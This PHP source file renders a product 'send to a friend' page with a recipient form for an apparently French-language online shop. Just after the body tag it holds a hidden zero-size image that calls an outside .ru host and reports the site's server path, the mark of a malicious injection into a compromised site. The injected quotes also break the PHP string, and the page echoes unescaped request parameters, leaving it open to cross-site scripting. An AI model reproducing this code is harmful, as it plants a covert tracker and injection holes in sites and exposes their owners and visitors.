<?php
include('lib/config.php');

$infos_prod = get_prod_infos_by_id($_GET['id']);

$cat = $_GET['cat'];
$desc1 = "description_".$_SESSION['langue'];
$desc2 = "description_supplementaire_".$_SESSION['langue'];

echo
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='ACCUEIL'>
	</head>
<body><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<table bgcolor='#FFFFFF' width='$LargeAchat' cellpadding='0' cellspacing='0' align='$Enligne' border='0' >
		<tr>
		<td>";


if( !is_array($infos_prod) ) 
	echo '<center>'.$txt['a1'].'</center>';
else {
	// si le ID du client est dans la session...
	if(isset($_SESSION[$_SERVER['SERVER_NAME']]))
		$infosClient = infos_client($_SESSION[$_SERVER['SERVER_NAME']]);

	echo "
		<table width='94%' align='center' cellpadding=8>
			<tr>
				<td Valign=top>
					<a href='produit_detail.php?cat=$cat&id=".$infos_prod['id']."' target='ACCUEIL'>
					<img src='photoget_web.php?No=".$infos_prod['id']."&Idx=".$infos_prod['medium']."' border=0 ></a>
				</td>
	        	<td width=100% align='left'>
	            <span class=titre>".
	                stripslashes($infos_prod['titre_'.$_SESSION['langue']]).
	         	"</span>
	        </td>
	    </tr>
	</table>";

?>

<form name="envoi_ami" action="envoi_ami_action.php?inav=12" method="post">
   <input type="hidden" name="id_prod" value="<?=$_GET['id']?>">
   <input type="hidden" name="id_cat" value="<?=$cat?>">
	<table cellpadding=4 cellspacing=0 width=100% align='center' border=0>
		<tr>
			<td width=100% align='center' colspan=2>
				<big><b><?=$txt['Remplissez_formulaire']?></b></big><br><br>
			</td>
		</tr>
		<tr>
			<td width=44% align='right'>
				<big><b><?=$txt['Vos_coordonnees']?></b></big><br>
			</td>
			<td width=56% align='left'>
				&nbsp;
			</td>
		</tr>
		<tr>
			<td align='right'>
			<b><?=$txt['Votre_prenom']?></b>
			</td>
			<td align='left'>
			<input type="text" name="envoi_prenom" class='form1' value="<? echo @$infosClient['Prenom']; ?>">
			</td>
		</tr>
		<tr>
			<td align='right'>
			<b><?=$txt['Votre_nom']?></b>
			</td>
			<td align='left'>
			<input type="text" name="envoi_nom" class='form1' value="<? echo @$infosClient['Nom']; ?>">
			</td>
		</tr>
		<tr>
			<td align='right'>
			<b><?=$txt['Votre_courriel']?></b>
			</td>
			<td align='left'>
			<input type="text" name="envoi_courriel" class='form1' value="<? echo @$infosClient['Courriel']; ?>">
			</td>
		</tr>
		<tr>
			<td width=100% align='center' colspan=2>
			<b><?=$txt['Votre_message']?></b>
			<br>
			<textarea name="envoi_text" rows=4 cols=50></textarea>
			</td>
		</tr>
		<tr>
			<td align='right'>
			<br>
			<big><b><?=$txt['Vos_amis']?></b></big>
			<br>
			</td>
			<td align='left'>
				&nbsp;		
			</td>
		</tr>
		<tr>
			<td align='right'>
			<b><?=$txt['form_prenom']?></b>
			</td>
			<td align='left'>
			<input type="text" name="dest_prenom[]" class='form1'>
			</td>
		</tr>
		<tr>
			<td align='right'>
			<b><?=$txt['form_nom']?></b>
			</td>
			<td align='left'>
			<input type="text" name="dest_nom[]" class='form1'>
			</td>
		</tr>
		<tr>
			<td align='right'>
			<b><?=$txt['form_courriel']?></b>
			</td>
			<td align='left'>
			<input type="text" name="dest_courriel[]" class='form1'>
			</td>
		</tr>
		<tr>
			<td width=60% align='center' colspan=2>
			<hr size=-2 width=40%>
			</td>
		</tr>
		<tr>
			<td align='right'>
			<b><?=$txt['form_prenom']?></b>
			</td>
			<td align='left'>
			<input type="text" name="dest_prenom[]" class='form1'>
			</td>
		</tr>
		<tr>
			<td align='right'>
			<b><?=$txt['form_nom']?></b>
			</td>
			<td align='left'>
			<input type="text" name="dest_nom[]" class='form1'>
			</td>
		</tr>
		<tr>
			<td align='right'>
			<b><?=$txt['form_courriel']?></b>
			</td>
			<td align='left'>
			<input type="text" name="dest_courriel[]" class='form1'>
			</td>
		</tr>
		<tr>
			<td width=60% align='center' colspan=2>
			<hr size=-2 width=40%>
			</td>
		</tr>
		<tr>
			<td align='right'>
			<b><?=$txt['form_prenom']?></b>
			</td>
			<td align='left'>
			<input type="text" name="dest_prenom[]" class='form1'>
			</td>
		</tr>
		<tr>
			<td align='right'>
			<b><?=$txt['form_nom']?></b>
			</td>
			<td align='left'>
			<input type="text" name="dest_nom[]" class='form1'>
			</td>
		</tr>
		<tr>
			<td align='right'>
			<b><?=$txt['form_courriel']?></b>
			</td>
			<td align='left'>
			<input type="text" name="dest_courriel[]" class='form1'>
			</td>
		</tr>
		<tr>
			<td width=100% align='center' Valign=top colspan=2>
			<br>
			<input type="submit" value="<?=$txt['form_soumettre']?>" class='form1'>
			</td>
		</tr>
	</table>
<?php
}
echo "
		</td>
		</tr>
	</table>
<script language='JavaScript1.2'>

	function Rafraichie(){
		 		window.location.reload();
//	str = 'envoi_ami.php?&id=".$_GET['id']."'; 
		 //open(str,'_self','status=no,toolbar=no,menubar=no,location=no,resizable=no' );
	} // Rafraichie

</script>
</body>
</html>";
?>